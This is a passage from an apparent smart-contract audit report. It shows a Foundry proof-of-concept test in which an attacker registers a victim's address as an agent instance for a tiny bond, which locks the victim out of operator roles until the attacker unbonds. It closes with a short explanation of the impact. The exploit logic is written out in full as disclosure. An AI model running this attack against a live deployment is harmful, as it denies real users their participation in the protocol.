        serviceRegistry = new ServiceRegistry("Service Registry", "SERVICE", "https://service/", address(agentRegistry));
        serviceRegistryTokenUtility = new ServiceRegistryTokenUtility(address(serviceRegistry));
        mockMultisig = new MockMultisig();

        serviceRegistry.changeMultisigPermission(address(mockMultisig), true);

        serviceManager = new ServiceManager(address(serviceRegistry), address(serviceRegistryTokenUtility));
        serviceRegistry.changeManager(address(serviceManager));
        serviceRegistryTokenUtility.changeManager(address(serviceManager));
    }

    function test_AgentInstanceGlobalLockout() public {
        // Setup - attacker creates component and agent
        vm.startPrank(attacker);

        uint32[] memory componentDeps = new uint32[](0);
        registriesManager.create(IRegistry.UnitType.Component, attacker, bytes32("component_hash"), componentDeps);

        uint32[] memory agentDeps = new uint32[](1);
        agentDeps[0] = 1;
        registriesManager.create(IRegistry.UnitType.Agent, attacker, bytes32("agent_hash"), agentDeps);

        // Attacker creates malicious service with minimal bond
        uint32[] memory agentIds = new uint32[](1);
        agentIds[0] = 1;

        IService.AgentParams[] memory agentParams = new IService.AgentParams[](1);
        agentParams[0] = IService.AgentParams({slots: 1, bond: uint96(MIN_BOND)});

        uint256 maliciousServiceId = serviceManager.create(
            attacker,
            address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
            bytes32("malicious_service"),
            agentIds,
            agentParams,
            1
        );

        serviceManager.activateRegistration{value: MIN_BOND}(maliciousServiceId);

        // Attacker registers VICTIM's address as an agentInstance without consent
        address[] memory agentInstances = new address[](1);
        agentInstances[0] = victim;
        uint32[] memory agentIdsToRegister = new uint32[](1);
        agentIdsToRegister[0] = 1;

        serviceManager.registerAgents{value: MIN_BOND}(maliciousServiceId, agentInstances, agentIdsToRegister);

        console.log("Attacker registered victim as agentInstance");
        vm.stopPrank();

        // Victim attempts to operate their own service - blocked
        vm.startPrank(victim);

        registriesManager.create(IRegistry.UnitType.Component, victim, bytes32("victim_component"), componentDeps);
        registriesManager.create(IRegistry.UnitType.Agent, victim, bytes32("victim_agent"), agentDeps);

        agentIds[0] = 2;
        agentParams[0] = IService.AgentParams({slots: 1, bond: 10 ether});

        uint256 victimServiceId = serviceManager.create(
            victim,
            address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE),
            bytes32("victim_service"),
            agentIds,
            agentParams,
            1
        );

        serviceManager.activateRegistration{value: 10 ether}(victimServiceId);

        // Victim attempts to register as operator - should revert
        address victimAgentInstance = vm.addr(10);
        agentInstances[0] = victimAgentInstance;
        agentIdsToRegister[0] = 2;

        vm.expectRevert();
        serviceManager.registerAgents{value: 10 ether}(victimServiceId, agentInstances, agentIdsToRegister);

        console.log("Victim blocked from being operator globally");
        vm.stopPrank();

        // Even after attacker terminates, victim remains blocked
        vm.prank(attacker);
        serviceManager.terminate(maliciousServiceId);
        console.log("Attacker terminated their service");

        vm.startPrank(victim);
        vm.expectRevert();
        serviceManager.registerAgents{value: 10 ether}(victimServiceId, agentInstances, agentIdsToRegister);
        console.log("Victim STILL blocked even after termination");
        vm.stopPrank();

        // Only after attacker unbonds is victim freed
        vm.prank(attacker);
        serviceManager.unbond(maliciousServiceId);
        console.log("Attacker unbonded - victim freed");

        vm.startPrank(victim);
        serviceManager.registerAgents{value: 10 ether}(victimServiceId, agentInstances, agentIdsToRegister);
        console.log("Victim can now register as operator");
        vm.stopPrank();
    }
}
```

* The PoC demonstrates that an attacker can register a victim's address as an agent instance without consent using only 1 wei, permanently blocking that victim from acting as an operator in any service. The lock persists even after the attacker's service is terminated, and only the attacker's call to `unbond()` frees the victim, giving the attacker complete control over the victim's protocol participation.

